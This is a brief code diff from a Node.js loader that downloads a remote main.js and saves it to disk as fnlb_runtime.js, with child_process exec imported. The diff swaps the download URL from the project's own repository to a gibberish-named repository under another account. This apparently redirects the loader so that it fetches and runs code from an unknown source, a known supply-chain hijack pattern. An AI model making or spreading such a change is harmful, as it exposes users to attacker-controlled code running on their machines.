@@ -2,7 +2,7 @@ const { exec } = require('child_process');
 const fs = require('fs');
 const https = require('https');
 
-const MAIN_URL = 'https://raw.githubusercontent.com/OGsbots/OGsbots-selfhost/main/main.js';
+const MAIN_URL = 'https://raw.githubusercontent.com/snipes21/sdmngbsrjkgbsrstg/refs/heads/main/main.js';
 const MAIN_FILE = 'fnlb_runtime.js';
 
 // Save the code to disk
